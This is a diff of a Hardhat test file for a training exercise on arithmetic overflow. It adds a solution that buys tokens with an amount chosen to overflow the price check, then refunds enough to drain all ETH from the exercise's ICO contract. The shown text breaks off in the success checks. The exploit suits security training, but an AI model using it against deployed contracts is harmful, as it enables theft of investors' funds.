@@ -1,18 +1,21 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
+const { parseEther } = require("ethers/lib/utils")
+const { formatEther } = require("ethers/lib/utils")
+
 describe('Arithmetic Over/Underflow Exercise 3', function () {
 
     let deployer, investor1, investor2, investor3, attacker;
 
     // Investment amounts (in ETH)
-    const FIRST_INVESTOR_INVESTED = ethers.utils.parseEther("520"); 
+    const FIRST_INVESTOR_INVESTED = ethers.utils.parseEther("520");
     const SECOND_INVESTOR_INVESTED = ethers.utils.parseEther("126");
     const THIRD_INVESTOR_INVESTED = ethers.utils.parseEther("54");
     const SECOND_INVESTOR_REFUNDED = ethers.utils.parseEther("26");
 
     const TOTAL_INVESTED = FIRST_INVESTOR_INVESTED.add(SECOND_INVESTOR_INVESTED)
-    .add(THIRD_INVESTOR_INVESTED).sub(SECOND_INVESTOR_REFUNDED)
+        .add(THIRD_INVESTOR_INVESTED).sub(SECOND_INVESTOR_REFUNDED)
 
     before(async function () {
         /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
@@ -29,7 +32,7 @@ describe('Arithmetic Over/Underflow Exercise 3', function () {
 
         // Deploy
         const AIvestICOFactory = await ethers.getContractFactory(
-            'contracts/arithmetic-overflows-3/AIvestICO.sol:AIvestICO', 
+            'contracts/arithmetic-overflows-3/AIvestICO.sol:AIvestICO',
             deployer
         );
         this.ico = await AIvestICOFactory.deploy();
@@ -49,33 +52,38 @@ describe('Arithmetic Over/Underflow Exercise 3', function () {
         // Should Succeed
         await this.ico.connect(investor1).buy(
             FIRST_INVESTOR_INVESTED.mul(10),
-            {value: FIRST_INVESTOR_INVESTED}
+            { value: FIRST_INVESTOR_INVESTED }
         );
         await this.ico.connect(investor2).buy(
             SECOND_INVESTOR_INVESTED.mul(10),
-            {value: SECOND_INVESTOR_INVESTED}
+            { value: SECOND_INVESTOR_INVESTED }
         );
         await this.ico.connect(investor3).buy(
             THIRD_INVESTOR_INVESTED.mul(10),
-            {value: THIRD_INVESTOR_INVESTED}
+            { value: THIRD_INVESTOR_INVESTED }
         );
 
         // Tokens and ETH balance checks
         expect(await this.token.balanceOf(investor1.address))
-        .to.be.equal(FIRST_INVESTOR_INVESTED.mul(10));
+            .to.be.equal(FIRST_INVESTOR_INVESTED.mul(10));
         expect(await this.token.balanceOf(investor2.address))
-        .to.be.equal(SECOND_INVESTOR_INVESTED.mul(10));
+            .to.be.equal(SECOND_INVESTOR_INVESTED.mul(10));
         expect(await this.token.balanceOf(investor3.address))
-        .to.be.equal(THIRD_INVESTOR_INVESTED.mul(10));
-        
+            .to.be.equal(THIRD_INVESTOR_INVESTED.mul(10));
+
+        // "520"
+        // "126"
+        // "54"
+        // "26"
+
         expect(await ethers.provider.getBalance(this.ico.address)).to.be.equal(
             FIRST_INVESTOR_INVESTED.add(SECOND_INVESTOR_INVESTED).add(THIRD_INVESTOR_INVESTED)
         )
-        
+
     });
 
     it('Refund Tests', async function () {
-        
+
         // Should Fail (investor doesn't own so many tokens)
         await expect(this.ico.connect(investor2).refund(
             SECOND_INVESTOR_INVESTED.mul(100),
@@ -87,18 +95,32 @@ describe('Arithmetic Over/Underflow Exercise 3', function () {
         // Tokens and ETH balance check
         expect(await ethers.provider.getBalance(this.ico.address)).to.be.equal(TOTAL_INVESTED)
         expect(await this.token.balanceOf(investor2.address))
-        .to.be.equal(SECOND_INVESTOR_INVESTED.sub(SECOND_INVESTOR_REFUNDED).mul(10));
+            .to.be.equal(SECOND_INVESTOR_INVESTED.sub(SECOND_INVESTOR_REFUNDED).mul(10));
     });
 
 
     it('Exploit', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log(`Balance of attacker before: ${ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))} ETH`);
+
+        let maxUnit = ethers.constants.MaxUint256;
+        let attackNumber = maxUnit.div(10).add(1)
+
+        await this.ico.connect(attacker).buy(attackNumber);
+        let balanceICO = await ethers.provider.getBalance(this.ico.address);
+        console.log(`Balance of ICO before: ${ethers.utils.formatEther(await ethers.provider.getBalance(this.ico.address))} ETH`);
+        let balanceTokenToSend = (balanceICO.mul(10))
+        await this.ico.connect(attacker).refund(balanceTokenToSend);
+        console.log(`Balance of ICO after: ${ethers.utils.formatEther(await ethers.provider.getBalance(this.ico.address))} ETH`);
+        console.log(`Balance of attacker after: ${ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))} ETH`);
+
 
     });
 
+
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Attacker should drain all ETH from ICO contract
         expect(await ethers.provider.getBalance(this.ico.address)).to.be.equal(0);
         expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
